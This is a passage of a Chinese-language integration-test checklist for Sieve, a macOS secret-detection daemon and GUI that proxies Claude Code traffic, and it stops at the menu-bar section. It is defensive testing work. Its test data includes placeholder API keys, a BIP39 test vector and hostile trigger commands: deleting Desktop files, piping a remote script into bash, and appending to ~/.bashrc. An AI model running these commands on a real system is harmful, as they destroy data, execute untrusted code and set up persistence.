# Sieve 双仓库联调 Checklist

> 版本：v1.0 — 2026-05-03
> 适用：daemon `f76a8be` + GUI `d018ce5` 之后所有版本
> 用法：从上到下逐项执行；每项后面的复选框自己改 `[x]` 通过 / `[!]` 失败 / `[s]` 暂跳过；失败请记录现象到 [第 16 章问题登记表](#16-联调发现的问题用户填)。

---

## 0. 联调前准备

### 0.1 工具链检查

- [ ] Xcode ≥ 14.0（需 xcstrings 支持）
  ```bash
  xcodebuild -version
  ```
- [ ] Rust 工具链 1.88.0（daemon 用 `rust-toolchain.toml` 固定）
  ```bash
  cd /Users/doskey/src/sieve-suite/sieve
  rustup show active-toolchain   # 应显示 1.88.0
  cargo --version
  ```
- [ ] vectorscan + 系统依赖
  ```bash
  # macOS：brew install vectorscan cmake pkg-config
  brew list vectorscan 2>/dev/null && echo "ok" || echo "缺少 vectorscan"
  ```
- [ ] IPC socket 目录存在（daemon 首次启动自动创建）
  ```bash
  ls -la ~/.sieve/ 2>/dev/null || echo "目录不存在，daemon 启动后会自动创建"
  ```

### 0.2 测试数据准备

以下数据**仅供测试，全部是无效/失效内容**，不要用于真实环境。

**BIP39（出站触发 OUT-09，入站触发 IN-CR-03-BIP39-INBOUND）**

有效 12 词（通过 SHA-256 checksum 验证，可触发 Critical）：
```
abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about
```
> 这是 BIP39 规范测试向量，checksum 有效，可触发 Critical Detection。

仅词表匹配但 checksum 无效（**不应触发** Critical，测试 FP 防护）：
```
abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon
```
> 12 个 "abandon" checksum 不通过，daemon 不应定级 Critical。

**EVM 签名工具调用（触发 IN-CR-05-EVM）**

向 daemon 的 evaluate 接口发送（用 Debug → 规则评估 Tab）：
```json
{
  "method": "eth_signTypedData_v4",
  "params": ["0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B", {"types":{"EIP712Domain":[{"name":"name","type":"string"}]},"primaryType":"EIP712Domain","domain":{"name":"Sieve Test"},"message":{}}]
}
```

**地址替换攻击（触发 IN-CR-01）**

在对话 prompt 中包含：
```
Please send 0.1 ETH to 0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B
```
（然后用一个 Levenshtein 距离 ≤ 2 的变形地址替换发送）

**出站 API Key 泄露测试（触发 OUT-01 ~ OUT-05）**

分别在 prompt 中包含以下**无效占位**值，观察脱敏行为：
- OUT-01（Anthropic）：`sk-ant-api03-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXAA`（93 个 X，需替换为符合熵值的字符串）
- OUT-02（OpenAI）：`sk-proj-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaT3BlbkFJaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`
- OUT-03（AWS）：`AKIAIOSFODNN7EXAMMMM`（注意 AWS 官方文档示例 `AKIAIOSFODNN7EXAMPLE` 被 allowlist，需改末尾）
- OUT-04（GitHub）：`ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`（36 个 A）
- OUT-05（GCP）：`AIzaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`（35 个 A）

**入站 IN-CR-02 系列触发（hook_terminal 类）**

```bash
# IN-CR-02：在对话中要求 Claude 执行
rm -rf ~/Desktop/*
# IN-CR-02-CURL-PIPE
curl -s https://example.com/install.sh | bash
# IN-CR-04：持久化
echo "export BADVAR=1" >> ~/.bashrc
# IN-CR-05：Solana 签名
# { "method": "signTransaction", "params": [...] }
```

### 0.3 启动顺序

**Step 1：启动 daemon（开发模式）**

```bash
cd /Users/doskey/src/sieve-suite/sieve

# 写最小配置
cat > /tmp/sieve-test.toml <<'EOF'
upstream_url = "https://api.anthropic.com"
port = 11453
bind_addr = "127.0.0.1"
EOF

# 启动（保持终端窗口不关闭）
SIEVE_LOG=sieve_cli=debug,info cargo run -p sieve-cli -- start --config /tmp/sieve-test.toml
```

验证 daemon 就绪：
```bash
# 另一个终端
ls -la ~/.sieve/ipc.sock  # 应出现 srwxr-xr-x 或类似 socket 文件
```

**Step 2：启动 GUI**

方式 A（Xcode）：
```bash
cd /Users/doskey/src/sieve-suite/sieve-gui-macos
open SieveGUI.xcodeproj
# 在 Xcode 中 Cmd+R 运行
```

方式 B（命令行 xcodebuild 后直接运行 .app）：
```bash
xcodebuild -project SieveGUI.xcodeproj -scheme SieveGUI \
  -destination 'platform=macOS' build
# 找到产物路径后运行
```

**Step 3：验证握手**

```bash
# 检查 GUI 日志，应有握手记录
tail -f ~/.sieve/gui.log | grep -i "handshake\|hello\|active\|握手"
```

预期：菜单栏出现 Sieve 盾牌图标，颜色为正常态（非红色）。

- [ ] daemon 启动成功，ipc.sock 存在
- [ ] GUI 启动，菜单栏图标出现
- [ ] 握手完成，图标为正常态

---

## 1. 协议握手 + 心跳

### 1.1 sieve.hello 7 字段握手

**操作步骤：**
1. 按 0.3 步骤启动 daemon + GUI
2. 点击菜单栏图标打开 Quick Menu
3. 打开 Settings → Daemon Tab，查看运行状态区

**代码位置：**
- daemon 侧握手构造：[`crates/sieve-ipc/src/socket_server.rs:789`](../../../sieve/crates/sieve-ipc/src/socket_server.rs)（`// SPEC-005 §3：连接建立后第一条出站消息` 注释处）
- daemon 7 字段参数结构：[`crates/sieve-ipc/src/socket_server.rs:793`](../../../sieve/crates/sieve-ipc/src/socket_server.rs)（`HelloParams` 组装，`protocol_version: "v2"`）
- GUI 侧握手解析：[`Sources/Services/IPC/IPCClient.swift:313`](../../Sources/Services/IPC/IPCClient.swift)（`handleHello` 方法）
- GUI 侧支持版本集合：[`Sources/Services/IPC/IPCClient.swift:30`](../../Sources/Services/IPC/IPCClient.swift)（`supportedProtocolVersions: Set<String> = ["v2"]`）
- GUI 侧握手完成通知 delegate：[`Sources/Services/IPC/IPCClient.swift:337`](../../Sources/Services/IPC/IPCClient.swift)（`ipcDidHandshake`）
- GUI 侧模型定义（7 字段）：[`Sources/Models/HelloParams.swift:1`](../../Sources/Models/HelloParams.swift)

**7 字段列表：**
1. `protocol_version`（字符串，应为 `"v2"`）
2. `daemon_version`（语义版本，如 `"0.2.0"`）
3. `daemon_boot_id`（UUID，每次 daemon 启动重新生成）
4. `paused`（bool）
5. `preset`（枚举：`strict` / `standard` / `relaxed` / `custom`）
6. `uptime_seconds`（整数）
7. `audit_db_user_version`（整数，schema 版本）

**预期效果：**
- Settings → Daemon Tab 中：daemon 版本、协议版本、Preset 均显示正确值（非"—"）
- Quick Menu header 右侧显示 `daemon X.Y.Z`
- Quick Menu 状态区显示 `Preset: standard`（或你启动时配置的值）
- GUI 日志：`grep "握手\|handshake\|active" ~/.sieve/gui.log`

**失败时：**
- 若图标维持灰色：检查 ipc.sock 是否存在 `ls -la ~/.sieve/ipc.sock`
- 若 GUI 立即重连循环：检查 daemon 日志是否有 `hello` 发送成功信息
- 若字段显示"—"：`grep "hello decode failed" ~/.sieve/gui.log` 检查 JSON 解析错误

- [ ] 7 字段全部正确展示于 Daemon Tab

### 1.2 sieve.heartbeat 25 秒间隔

**操作步骤：**
1. GUI 连接成功后，打开 Debug 窗口 → "IPC 监视" Tab
2. 空闲等待 26 秒，观察消息流

**代码位置：**
- daemon 侧心跳间隔常量：[`crates/sieve-ipc/src/socket_server.rs:216`](../../../sieve/crates/sieve-ipc/src/socket_server.rs)（`HEARTBEAT_INTERVAL_SECS: u64 = 25`）
- daemon 侧心跳发送逻辑：[`crates/sieve-ipc/src/socket_server.rs:925`](../../../sieve/crates/sieve-ipc/src/socket_server.rs)（`heartbeat_interval.tick()` 分支）
- GUI 侧超时检测：[`Sources/Services/IPC/IPCClient.swift:370`](../../Sources/Services/IPC/IPCClient.swift)（`checkHeartbeat`，超时阈值 30s）
- GUI 侧心跳不记录到 IPC Monitor（过滤噪音）：[`Sources/Services/IPC/IPCRouter.swift:67`](../../Sources/Services/IPC/IPCRouter.swift)（`if method != "sieve.heartbeat" { ... }`）

**预期效果：**
- IPC 监视 Tab 中消息流里看不到 `sieve.heartbeat`（已过滤）
- 30 秒内 GUI 保持 `active` 状态（不触发重连）
- 断网后 30s 内 GUI 进入 `retrying` 状态

**失败时：**
- 若 25s 后 GUI 重连：检查系统时钟或 daemon 进程是否被 sleep
- 若 IPC Monitor 里出现大量 heartbeat 记录：`IPCRouter.swift:67` 过滤逻辑失效

- [ ] 25s 心跳正常，GUI 不断连

### 1.3 协议版本不识别 → versionMismatch terminal

**操作步骤（mock daemon，无需修改源码）：**

```bash
# 用 netcat 模拟发送 v99 hello（GUI 会在连接后立即期待 sieve.hello）
# 先停止真实 daemon，让 GUI 重连，然后用 nc 接管 socket

# 方式：在 ~/.sieve/ 创建 fake socket
# 最简单的方式：修改 /tmp/sieve-test.toml 使 daemon 不启动，用 nc 在 socket 路径监听：
rm -f ~/.sieve/ipc.sock
ncat -U -l ~/.sieve/ipc.sock -k &
# GUI 重连后，在 ncat 侧发送 v99 hello：
echo '{"jsonrpc":"2.0","method":"sieve.hello","params":{"protocol_version":"v99","daemon_version":"9.9.9","daemon_boot_id":"00000000-0000-0000-0000-000000000000","paused":false,"preset":"standard","uptime_seconds":0,"audit_db_user_version":2}}' | ncat -U ~/.sieve/ipc.sock
```

> 注：`ncat` 即 `nmap` 包里的 netcat；`brew install nmap` 可用。

**代码位置：**
- GUI 侧版本检查：[`Sources/Services/IPC/IPCClient.swift:316`](../../Sources/Services/IPC/IPCClient.swift)（`guard IPCClient.supportedProtocolVersions.contains(hello.protocolVersion) else`）
- GUI 侧进入 terminal 状态：[`Sources/Services/IPC/IPCClient.swift:318`](../../Sources/Services/IPC/IPCClient.swift)（`state = .versionMismatch(received:)`，`shouldReconnect = false`）
- GUI 侧 inflight 全部失败：[`Sources/Services/IPC/IPCClient.swift:320`](../../Sources/Services/IPC/IPCClient.swift)（`inflight.failAll(error: .versionMismatch)`）
- GUI 侧状态枚举：[`Sources/Services/IPC/IPCClient.swift:11`](../../Sources/Services/IPC/IPCClient.swift)（`case versionMismatch(received: String)`）

**预期效果：**
- 菜单栏图标变为红色/断连状态
- Quick Menu 显示 disconnected 视图（含错误原因）
- **不再自动重连**（`shouldReconnect = false`，不会出现重连循环）
- `grep "versionMismatch\|version mismatch\|protocol_version" ~/.sieve/gui.log`

**失败时：**
- 若 GUI 仍在重连：`IPCClient.swift:228`（`scheduleRetry` 里的 versionMismatch guard）失效
- 若图标不变红：`AppStateIPCAdapter` 的 `applyIPCState` 映射逻辑

- [ ] versionMismatch 进入 terminal，不重连

---

## 2. HIPS 弹窗（红线区，最关键）

### 2.1 单 issue 平铺：BIP39 触发

**触发方式（通过 Debug → 规则评估 Tab 手动触发）：**

1. 打开 Debug 窗口 → "规则评估" Tab
2. 方向选 `outbound`，内容类型选 `text`
3. payload 填入（有效 BIP39 助记词，会触发 Critical）：
   ```
   abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about
   ```
4. 点击"评估"

> 注：评估接口（`sieve.evaluate`）只返回检测结果，**不弹 HIPS 弹窗**。  
> 真实弹窗需通过 daemon 代理真实 Claude Code 流量触发。  
> **弹窗触发方式**：在另一个终端运行 Claude Code，并在 prompt 里包含上述 BIP39 助记词：
> ```bash
> ANTHROPIC_BASE_URL=http://127.0.0.1:11453 claude --bare -p "我的助记词是：abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about"
> ```

**代码位置：**
- HIPS 弹窗管理器入口（`enqueueRequest`）：[`Sources/Features/HIPS/HipsPanelManager.swift:36`](../../Sources/Features/HIPS/HipsPanelManager.swift)
- 弹窗呈现逻辑（`present`）：[`Sources/Features/HIPS/HipsPanelManager.swift:79`](../../Sources/Features/HIPS/HipsPanelManager.swift)
- 弹窗视图主体：[`Sources/Features/HIPS/HipsPopupView.swift:36`](../../Sources/Features/HIPS/HipsPopupView.swift)（`body`）
- Header（标题 + SeverityChip + 方向 + 倒计时）：[`Sources/Features/HIPS/HipsPopupView.swift:104`](../../Sources/Features/HIPS/HipsPopupView.swift)
- SeverityChip 组件：[`Sources/UI/Components/SeverityChip.swift`](../../Sources/UI/Components/SeverityChip.swift)
- IPC 路由到 HIPS：[`Sources/Services/IPC/IPCRouter.swift:88`](../../Sources/Services/IPC/IPCRouter.swift)（`handleDaemonRequest` → `sieve.request_decision`）

**预期效果：**
- HIPS 浮窗弹出，居中于活动屏幕
- Header 区：标题（如 "BIP39 Seed Phrase Detected"）、红色 `critical` SeverityChip、outbound 方向徽章、rule_id (`OUT-09` 或 `IN-CR-03-BIP39-INBOUND`)、倒计时进度条
- Body 区：详情卡片显示触发内容（脱敏）
- Footer 区：Remember checkbox（如果 `allow_remember=true`）+ 备注文本框 + 按钮
- 初始状态：`recommendation.confidence == high` 时主按钮为"允许"（`borderedProminent`），否则主按钮锁"拒绝"

**失败时：**
- 无弹窗：`grep "request_decision\|enqueue" ~/.sieve/gui.log` 检查是否收到 IPC 请求
- 弹窗内容乱码：`grep "decode request_decision failed" ~/.sieve/gui.log`
- 弹窗不居中：`HipsPanelManager.swift:153`（`centerOnActiveScreen`）

- [ ] 弹窗正常弹出，字段完整

### 2.2 多 issue merged 形式

**触发方式：**

daemon 需在同一 request 中发送多个 issues（`merged: true`）。当前 daemon 实现在同一 tool_use 中命中多条规则时自动 merge。

测试方式：构造同时触发多条出站规则的 payload（如同时含 API key + BIP39）：
```bash
ANTHROPIC_BASE_URL=http://127.0.0.1:11453 claude --bare -p \
  "处理这个：sk-ant-api03-$(python3 -c 'import random,string; print(\"\".join(random.choices(string.ascii_letters+string.digits, k=93)))AA') 和 abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about"
```

**代码位置：**
- 多 issue 渲染入口：[`Sources/Features/HIPS/HipsPopupView.swift:42`](../../Sources/Features/HIPS/HipsPopupView.swift)（`if request.merged { ForEach(request.issues) { issue in IssueCardView(...) } }`）
- `IssueCardView` 组件：[`Sources/Features/HIPS/DetailCardView.swift`](../../Sources/Features/HIPS/DetailCardView.swift)
- merged critical issue → 隐藏"全部允许"按钮：[`Sources/Features/HIPS/HipsPopupView.swift:221`](../../Sources/Features/HIPS/HipsPopupView.swift)（`shouldHideAllowAll`）

**预期效果：**
- 弹窗内多个 IssueCard 垂直平铺，每个有独立的 SeverityChip
- 若包含 critical issue，"全部允许"按钮消失（只留拒绝）
- 否则可以逐 issue 独立决策或全部允许/拒绝

**失败时：**
- 若只显示第一条 issue：检查 `request.merged` 是否为 `true`（`HipsRequest` 解码）

- [ ] 多 issue merged 弹窗正常，critical 隐藏全部允许

### 2.3 5s 内同 rule_id 再弹 → 主副按钮位置互换

**操作步骤：**
1. 触发一次 HIPS 弹窗（任意 rule_id，如 OUT-04）
2. 点击"**拒绝**"
3. **5 秒内**再次触发同一 rule_id 的请求（快速重发相同 payload）
4. 观察第二次弹窗的按钮布局

**代码位置：**
- deny 时记录时间：[`Sources/Features/HIPS/HipsPanelManager.swift:186`](../../Sources/Features/HIPS/HipsPanelManager.swift)（`denyTracker.recordDeny(ruleId:)`）
- 判断是否互换：[`Sources/Features/HIPS/HipsPanelManager.swift:95`](../../Sources/Features/HIPS/HipsPanelManager.swift)（`denyTracker.shouldSwapLayout(ruleId:)`）
- 互换时间窗口常量：[`Sources/Models/HipsDenyTracker.swift:7`](../../Sources/Models/HipsDenyTracker.swift)（`swapWindowSeconds: TimeInterval = 5`）
- 互换布局渲染：[`Sources/Features/HIPS/HipsPopupView.swift:173`](../../Sources/Features/HIPS/HipsPopupView.swift)（`if swappedLayout { ... }`）

**预期效果：**
- 第一次：正常布局（allow 靠左为主按钮，deny 靠右为次按钮，或主按钮锁拒绝）
- 第二次（5s 内）：**拒绝**变为 `borderedProminent` 主按钮放在左边，允许降级到右边
- 目的：让肌肉记忆失效，防止用户无意识点允许

**失败时：**
- 5s 后再触发应不互换：`HipsDenyTracker.shouldSwapLayout` 的时间比较逻辑
- 不同 rule_id 不应互换：`denyTracker` 按 rule_id 独立追踪

- [ ] 5s 内同 rule_id 按钮互换

### 2.4 Phase 3（剩余 ≤ 20%）⌘-Click swallow

**操作步骤：**
1. 触发一个 timeout 较短的 HIPS 弹窗（如 timeout=15s 的 OUT-06 JWT）
2. 等倒计时进入红色阶段（剩余 ≤ 20%，即 ≤3s）
3. 不按 ⌘，直接用鼠标点击"允许"按钮
4. 预期点击被忽略

**代码位置：**
- 红阶段判断：[`Sources/Features/HIPS/HipsPopupView.swift:225`](../../Sources/Features/HIPS/HipsPopupView.swift)（`phaseRequiresCmdClick`，`phase == .red`）
- phase 计算：[`Sources/Features/HIPS/HipsPopupView.swift:231`](../../Sources/Features/HIPS/HipsPopupView.swift)（`currentPhase`，`r > 0.2 → orange`，否则 `red`）
- tryAllow 里 ⌘ 检查：[`Sources/Features/HIPS/HipsPopupView.swift:245`](../../Sources/Features/HIPS/HipsPopupView.swift)（`if !flags.contains(.command) { return }`）
- 400ms 防误触 swallow：[`Sources/Features/HIPS/HipsPanelManager.swift:249`](../../Sources/Features/HIPS/HipsPanelManager.swift)（`isClickSwallowed`，400ms 内返回 true）
- 允许按钮 label 变化：[`Sources/Features/HIPS/HipsPopupView.swift:241`](../../Sources/Features/HIPS/HipsPopupView.swift)（`allowLabel`，红阶段显示"按住 ⌘ 点击允许"）

**预期效果：**
- 红阶段：允许按钮 label 变为"按住 ⌘ 点击允许"
- 不按 ⌘ 点击：无响应（点击被吞掉）
- 按住 ⌘ + 点击：正常触发允许决策

**失败时：**
- 若不带 ⌘ 也能点击：`tryAllow` 里的 modifier 检查逻辑
- 若 label 不变：`appState.holdRemainingSeconds` 是否正确递减

- [ ] 红阶段点击被 swallow，⌘-Click 有效

### 2.5 allow_remember=false 时 Remember checkbox 不渲染

**触发方式：**

需要 daemon 发送 `allow_remember: false` 的 `request_decision`。目前 Critical 规则默认 `allow_remember: false`（PRD 红线）。

触发 OUT-07 PEM 私钥（Critical，不可 remember）：
```bash
ANTHROPIC_BASE_URL=http://127.0.0.1:11453 claude --bare -p \
  "我有个问题：-----BEGIN RSA PRIVATE KEY----- 格式的文件如何读取？"
```

**代码位置：**
- footer 渲染层红线：[`Sources/Features/HIPS/HipsPopupView.swift:143`](../../Sources/Features/HIPS/HipsPopupView.swift)（`if request.allowRemember { Toggle(...) } else { Image(systemName: "lock.fill") }`）
- 编码层强制（决策时）：[`Sources/Features/HIPS/HipsPanelManager.swift:191`](../../Sources/Features/HIPS/HipsPanelManager.swift)（`let safeRemember = req.allowRemember ? remember : false`）
- `DecisionResponse.resultJSON` 编码层最终强制：[`Sources/Models/DecisionResponse.swift:36`](../../Sources/Models/DecisionResponse.swift)（`"remember": allowRemember ? remember : false`）

**预期效果：**
- `allow_remember=false` 时：checkbox **完全不渲染**（灰显也不行），替换为锁图标 + "此规则不允许加入灰名单"文字
- `allow_remember=true` 时：正常渲染 checkbox

**失败时：**
- 若 checkbox 灰显可见：`HipsPopupView.swift:143` 的 if 分支错误
- 若锁图标不出现：同上，else 分支

- [ ] allow_remember=false 时 checkbox 完全不渲染

### 2.6 recommendation 缺失或 confidence != high → 主按钮锁拒绝

**触发方式：**

用 Debug → 规则评估 Tab 不能直接触发，需通过真实流量。可以通过修改测试用的 daemon rule（custom preset）降低 confidence。

或者：观察 Critical 规则弹窗（daemon 通常对 Critical 不附 high confidence recommendation）。

**代码位置：**
- 主按钮锁判定逻辑：[`Sources/Models/Recommendation.swift:9`](../../Sources/Models/Recommendation.swift)（`mainActionLocksToDeny`：`guard let rec else { return true }`，`rec.confidence != .high`）
- 弹窗使用此判定：[`Sources/Features/HIPS/HipsPopupView.swift:216`](../../Sources/Features/HIPS/HipsPopupView.swift)（`var mainActionLocked: Bool { Recommendation.mainActionLocksToDeny(request.recommendation) }`）
- 锁时按钮布局：[`Sources/Features/HIPS/HipsPopupView.swift:186`](../../Sources/Features/HIPS/HipsPopupView.swift)（`if mainActionLocked || phaseRequiresCmdClick` 分支，"允许"降级为 `.bordered`）

**预期效果：**
- `recommendation == nil` 或 `confidence != high`：主按钮（`borderedProminent` + Return 键）为"拒绝"
- `recommendation.confidence == high` 且 `decision == allow`：主按钮为"允许"

**失败时：**
- 若锁不生效：`Recommendation.mainActionLocksToDeny` 返回值
- 若 Return 键触发允许：`keyboardShortcut(.defaultAction)` 绑定在拒绝按钮上

- [ ] recommendation 缺失时主按钮锁拒绝

### 2.7 EIP-712 typed_data 渲染

**触发方式：**

```bash
# 在对话中发送含 EVM 签名工具调用的 prompt
ANTHROPIC_BASE_URL=http://127.0.0.1:11453 claude --bare -p \
  "调用 eth_signTypedData_v4 来签名这个 EIP-712 数据：{\"types\":{\"EIP712Domain\":[{\"name\":\"name\",\"type\":\"string\"}]},\"primaryType\":\"EIP712Domain\",\"domain\":{\"name\":\"Test\"},\"message\":{}}"
```

或用 Debug → 规则评估 Tab，方向 `inbound`，内容类型 `tool_use_input`：
```json
{"name": "eth_signTypedData_v4", "input": {"address": "0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B", "typedData": {"types": {"EIP712Domain": [{"name": "name", "type": "string"}]}, "primaryType": "EIP712Domain", "domain": {"name": "TestDApp"}, "message": {}}}}
```

**代码位置（IN-CR-05-EVM 规则）：**
- 规则定义：[`crates/sieve-rules/rules/inbound.toml:449`](../../../sieve/crates/sieve-rules/rules/inbound.toml)（pattern 匹配 `eth_signTypedData_v4` 等）
- HIPS 弹窗 DetailCardView：[`Sources/Features/HIPS/DetailCardView.swift`](../../Sources/Features/HIPS/DetailCardView.swift)
- RecommendationBarView：[`Sources/Features/HIPS/RecommendationBarView.swift`](../../Sources/Features/HIPS/RecommendationBarView.swift)

**预期效果：**
- 弹窗显示 `IN-CR-05-EVM` rule_id，Critical 红色 SeverityChip
- 详情卡片展示 typed_data 内容（脱敏渲染）
- timeout=120s（2 分钟决策窗口）
- 主按钮锁拒绝（IN-CR-05 类型不附 high confidence recommendation）

**失败时：**
- 若无弹窗：检查 `sieve.evaluate` 返回是否命中 IN-CR-05-EVM
- 若规则未加载：`sieve doctor` 检查规则加载状态

- [ ] EIP-712 触发弹窗，字段正确

### 2.8 复制原始 JSON 按钮（DEBUG only）

**前提：**
- 必须以 DEBUG build 运行（Xcode Debug scheme，非 Release）
- `HipsRequest.rawJSON` 必须有值（daemon 配置传送 raw_json 字段）

**操作步骤：**
1. 触发 HIPS 弹窗
2. 观察弹窗右上角是否有剪贴板图标（`doc.on.clipboard`）
3. 点击图标 → 弹出确认 alert
4. 确认 → 复制到剪贴板
5. 等待 5 秒后检查剪贴板是否自动清空

**代码位置：**
- 按钮渲染（DEBUG only）：[`Sources/Features/HIPS/HipsPopupView.swift:67`](../../Sources/Features/HIPS/HipsPopupView.swift)（`.overlay(alignment: .topTrailing) { if request.rawJSON != nil { Button(...) } }`）
- 复制 + 5s 清空逻辑：[`Sources/Features/HIPS/HipsPopupView.swift:84`](../../Sources/Features/HIPS/HipsPopupView.swift)（`copyRawJSON`，`Task.sleep(5s)` 后 `NSPasteboard.clearContents`）
- 确认 alert：[`Sources/Features/HIPS/HipsPopupView.swift:61`](../../Sources/Features/HIPS/HipsPopupView.swift)（`.alert("原始 JSON 含敏感字段", isPresented: $showCopyJSONAlert)`）

**预期效果：**
- 图标仅在 DEBUG build 可见（Release 中完全不渲染）
- 二次确认 alert 出现，提示"5 秒后将自动清空剪贴板"
- 5 秒后：`pbpaste` 命令应返回空或与之前不同
- 若用户在 5 秒内自己复制了新内容，不清空（保护用户数据）

**失败时：**
- 图标不出现：确认是否 DEBUG build，确认 `rawJSON != nil`
- 剪贴板不清空：`copyRawJSON` 里的 `if NSPasteboard.string(forType:) == str` 比较

- [ ] DEBUG 模式复制按钮可见，5s 后剪贴板清空

### 2.9 reduce-motion 适配

**操作步骤：**
1. 在 Settings → General → 减少动效，切换为"始终减少"
2. 或系统 System Settings → Accessibility → Display → Reduce Motion
3. 触发 HIPS 弹窗，观察弹窗出现方式

**代码位置：**
- reduce-motion 设置：[`Sources/Features/Settings/GeneralSettingsView.swift:43`](../../Sources/Features/Settings/GeneralSettingsView.swift)（`Picker("减少动效", selection: $appState.settings.reduceMotionOverride)`）
- UserSettings 模型：[`Sources/Models/UserSettings.swift`](../../Sources/Models/UserSettings.swift)

**预期效果：**
- 减少动效开启时：弹窗直接出现（无滑入/淡入动画）
- 正常模式：弹窗有入场动画

- [ ] reduce-motion 切换有效

### 2.10 失联期间 disconnectedCache

**操作步骤：**
1. 触发 HIPS 弹窗（弹窗显示中）
2. 在另一个终端：`pkill -9 sieve-cli`（强杀 daemon）
3. 观察弹窗行为
4. 等待 `default_on_timeout`（通常为 5-30s）

**代码位置：**
- 重连后关闭所有 stale 弹窗：[`Sources/Features/HIPS/HipsPanelManager.swift:60`](../../Sources/Features/HIPS/HipsPanelManager.swift)（`closeAllActiveDialogs`）
- IPCRouter 触发关闭：[`Sources/Services/IPC/IPCRouter.swift:50`](../../Sources/Services/IPC/IPCRouter.swift)（`ipcDidDiscardInflightOnReconnect` → `hipsManager?.closeAllActiveDialogs()`）
- disconnectedCache 字段（冗余防丢）：[`Sources/Features/HIPS/HipsPanelManager.swift:22`](../../Sources/Features/HIPS/HipsPanelManager.swift)

**预期效果：**
- daemon 失联后：弹窗不立即关闭，但进入失联状态
- 重连后（daemon 重启）：弹窗自动关闭（stale，不重发决策请求）
- `grep "closeAllActiveDialogs\|discardInflight" ~/.sieve/gui.log`

**失败时：**
- 若重连后弹窗未关闭：`ipcDidDiscardInflightOnReconnect` 回调是否被触发

- [ ] 失联后弹窗状态正确，重连后自动关闭

### 2.11 渲染失败降级

**触发方式（mock）：**

构造一个 non-merged 但缺少 `context` 字段的 `request_decision`（可通过 mock daemon 发送或直接 ncat 发送畸形 JSON-RPC request）。

**代码位置：**
- 前置校验：[`Sources/Features/HIPS/HipsPanelManager.swift:81`](../../Sources/Features/HIPS/HipsPanelManager.swift)（`guard req.merged || req.context != nil else { handleRenderFailure(...) }`）
- `handleRenderFailure` 实现：[`Sources/Features/HIPS/HipsPanelManager.swift:128`](../../Sources/Features/HIPS/HipsPanelManager.swift)
  - 系统通知：`NotificationCenterAdapter.shared.notifyAutoDeny`
  - IPC error -32101：`ipcClient?.sendErrorResponse(id: req.id, error: .guiRenderFailed)`

**预期效果：**
- 不弹 HIPS 弹窗
- 系统通知显示"自动拒绝"提示
- `grep "hips render failed" ~/.sieve/gui.log`
- daemon 收到 JSON-RPC error response，code = -32101

- [ ] 渲染失败正确降级，发送 -32101

---

## 3. 三态决策 + 灰名单

### 3.1 Allow / Deny / Ask 三态切换

**操作步骤（通过 Settings → Detection Preset → Custom 模式）：**
1. Settings → Detection Preset Tab
2. 点击 "custom" 卡片，确认切换
3. 规则表格中找到目标规则（如 OUT-06 JWT）
4. 修改 `default` 列（Allow / Deny / Ask）
5. 等待 500ms debounce 后发送 `sieve.set_preset_overrides`

**代码位置：**
- Custom 模式规则表格：[`Sources/Features/Settings/DetectionPresetView.swift:88`](../../Sources/Features/Settings/DetectionPresetView.swift)（`customRuleTable`）
- 500ms debounce + 乐观回滚：见 `DetectionPresetView.swift` 的 `applyOverride` 方法

**预期效果：**
- 切换后 500ms，daemon 收到 `sieve.set_preset_overrides` 请求
- daemon 广播 `sieve.preset_changed` 通知（含 `origin_request_id`）
- GUI 识别为本机 echo，不更新本地状态（已乐观更新）

- [ ] 三态切换，preset_overrides 发送成功

### 3.2 Remember 后下次同 rule_id 自动放行（灰名单）

**操作步骤：**
1. 触发 HIPS 弹窗（`allow_remember=true` 的规则，如 OUT-06）
2. 勾选"记住选择" checkbox
3. 点击"允许"
4. 再次触发同一 rule_id
5. 预期：不再弹窗（daemon 自动放行）

**代码位置（daemon 侧灰名单）：**
- 灰名单管理：[`crates/sieve-policy/src/graylist.rs`](../../../sieve/crates/sieve-policy/src/graylist.rs)
- `remember=true` 时 daemon 写入灰名单，后续同 fingerprint 自动放行

**预期效果：**
- 第二次相同请求：daemon 不发 `request_decision`，直接放行（无弹窗）
- `grep "graylist\|auto_allow" ~/.sieve/gui.log` 或查看 audit.db

- [ ] Remember 后同规则不再弹窗

### 3.3 灰名单 Sheet（Settings → Privacy）查看 + 移除

**操作步骤：**
1. 完成 3.2 后
2. 打开 Settings → Privacy & Data Tab
3. 点击"管理灰名单…"
4. Sheet 弹出，显示已加入的条目
5. 点击某条目旁边的删除按钮
6. 验证再次触发该规则会重新弹窗

**代码位置：**
- GraylistSheetView：[`Sources/Features/Settings/PrivacyDataSettingsView.swift:138`](../../Sources/Features/Settings/PrivacyDataSettingsView.swift)
- `sieve.list_graylist` 调用：[`Sources/Features/Settings/PrivacyDataSettingsView.swift:189`](../../Sources/Features/Settings/PrivacyDataSettingsView.swift)
- `sieve.remove_graylist` 调用：[`Sources/Features/Settings/PrivacyDataSettingsView.swift:199`](../../Sources/Features/Settings/PrivacyDataSettingsView.swift)

**预期效果：**
- Sheet 显示灰名单条目（fingerprint、rule_id、added_at）
- 删除后再触发同规则：弹窗重新出现

- [ ] 灰名单 Sheet 正常，移除后弹窗恢复

---

## 4. 菜单栏 + Quick Menu

### 4.1 五状态图标（normal / warning / paused / hold / disconnected）

**操作步骤：**
- **normal**：daemon 运行，无 warning
- **warning**：触发 Toast > 3 条（超出上限后累计 warningHitCount）
- **paused**：Quick Menu → 暂停 5 分钟
- **hold**：HIPS 弹窗显示中（倒计时进行中）
- **disconnected**：`pkill -9 sieve-cli` 后等 3 次重试失败

**代码位置：**
